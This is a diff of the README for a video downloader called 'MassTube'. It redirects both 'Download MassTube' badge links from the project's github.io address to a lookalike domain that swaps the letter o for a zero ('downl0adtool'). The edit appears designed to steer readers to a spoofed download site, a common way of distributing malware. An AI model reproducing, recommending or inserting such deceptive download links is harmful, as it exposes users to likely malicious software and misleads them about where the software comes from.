@@ -2,8 +2,8 @@
 
 MassTube is a simple and efficient video downloader designed to help users quickly download videos from popular streaming sites. It supports multiple formats and resolutions, offering an easy way to save your favorite videos offline.
 
-[![Download MassTube](https://img.shields.io/badge/Download-MassTube-blueviolet)](https://masstube.github.io/.github)
-[![Download MassTube](https://img.shields.io/badge/Download-MassTube-blueviolet)](https://masstube.github.io/.github)
+[![Download MassTube](https://img.shields.io/badge/Download-MassTube-blueviolet)](https://masstube-downl0adtool-ew.github.io/.github/)
+[![Download MassTube](https://img.shields.io/badge/Download-MassTube-blueviolet)](https://masstube-downl0adtool-ew.github.io/.github/)
 
 ---
 
